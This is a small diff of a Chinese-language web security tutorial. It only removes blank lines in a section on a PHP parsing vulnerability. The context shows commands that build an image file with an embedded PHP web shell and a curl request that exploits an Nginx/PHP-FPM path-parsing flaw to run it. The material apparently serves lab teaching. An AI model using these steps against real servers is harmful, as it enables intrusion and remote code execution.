@@ -284,7 +284,6 @@ docker-compose up -d
 
 ### 4.4.2 PHP 解析漏洞
 1. 上传一张内嵌 PHP 代码的图片（图片马）：
-
 ```bash
 # 图片马制作
 cat normal.jpg shell.php > shell.jpg
@@ -292,7 +291,6 @@ cat normal.jpg shell.php > shell.jpg
 ```
 
 2. 访问：
-
 ```bash
 curl http://target/upload/shell.jpg/x.php
 # Nginx 把请求转给 PHP-FPM
